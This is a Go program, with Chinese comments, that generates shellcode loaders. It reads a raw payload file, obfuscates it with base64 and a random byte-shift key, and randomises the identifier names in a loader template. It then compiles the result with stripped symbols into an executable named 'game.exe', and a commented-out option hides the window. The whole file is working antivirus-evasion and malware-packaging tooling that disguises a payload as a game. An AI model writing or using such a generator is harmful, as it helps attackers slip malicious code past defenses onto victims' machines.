package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"strings"
	"time"
)

var (
	key          []byte
	keys         string
	keyName      string
	decodeName   string
	genName      string
	gd           string
	bbdataName   string
	shellCodeHex string
	bdata        string
)

func init() {
	//初始化key
	key = getKey()
	//key变量名
	keyName = randString(4)
	//解码方法名
	decodeName = randString(5)
	//生成exe方法名
	genName = randString(3)
	//混淆方法名
	gd = randString(6)

	//base64变量
	bbdataName = randString(2)

	shellCodeHex = randString(4)
}

func getKey() []byte {
	keys = randString(2)
	b := []byte(keys)
	return b
}

func randString(len int) string {
	r := rand.New(rand.NewSource(time.Now().Unix()))
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		b := r.Intn(26) + 65
		bytes[i] = byte(b)
	}
	return string(bytes)
}

func getEnCode(data []byte) string {
	bdata1 := base64.StdEncoding.EncodeToString(data)
	bydata1 := []byte(bdata1)
	var shellcode []byte

	for i := 0; i < len(bydata1); i++ {
		shellcode = append(shellcode, bydata1[i]+key[0]-key[1])
	}
	return base64.StdEncoding.EncodeToString(shellcode)
}

func gen(code *string) {

	*code = strings.ReplaceAll(*code, "$bdata", bdata)
	*code = strings.ReplaceAll(*code, "$bbdata", bbdataName)
	*code = strings.ReplaceAll(*code, "$keyName", keyName)
	*code = strings.ReplaceAll(*code, "$keys", keys)
	*code = strings.ReplaceAll(*code, "$shellCodeHex", shellCodeHex)
	*code = strings.ReplaceAll(*code, "$gd", gd)
	//*code=strings.ReplaceAll(*code, "$gdNum", ss)
	*code = strings.ReplaceAll(*code, "$genEXE", genName)
	*code = strings.ReplaceAll(*code, "$getDeCode", decodeName)

}

func main() {

	path := "C:\\Users\\Administrator\\Desktop\\payload.bin"
	if len(os.Args) >= 2 {
		path = os.Args[1]
	}
	sc, _ := ioutil.ReadFile(path)
	bdata = getEnCode(sc)
	fmt.Println("获取payload", "---->", path)
	//fmt.Println(bdata)
	time.Sleep(1 * time.Second)
	//ioutil.WriteFile("shellcode.txt", []byte(bdata), 0666)
	fmt.Println("解析shellcode模板")
	time.Sleep(1 * time.Second)
	tmpl, _ := ioutil.ReadFile("./template")
	code := string(tmpl)
	fmt.Println("生成shellcode")
	time.Sleep(1 * time.Second)

	gen(&code)
	ioutil.WriteFile("shellcode.go", []byte(code), 0666)

	fmt.Println("编译shellcode")
	time.Sleep(1 * time.Second)

	cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -o game.exe ./shellcode.go")
	//隐藏窗口，如有需要自行替换
	//cmd:= exec.Command("cmd.exe","/c","go build -ldflags=-s -ldflags=-H=windowsgui -o game.exe ./shellcode.go")
	//阻塞至等待命令执行完成
	err1 := cmd.Run()
	if err1 != nil {
		panic(err1)
	}
	fmt.Println("game.exe")
	os.Remove("shellcode.go")

}
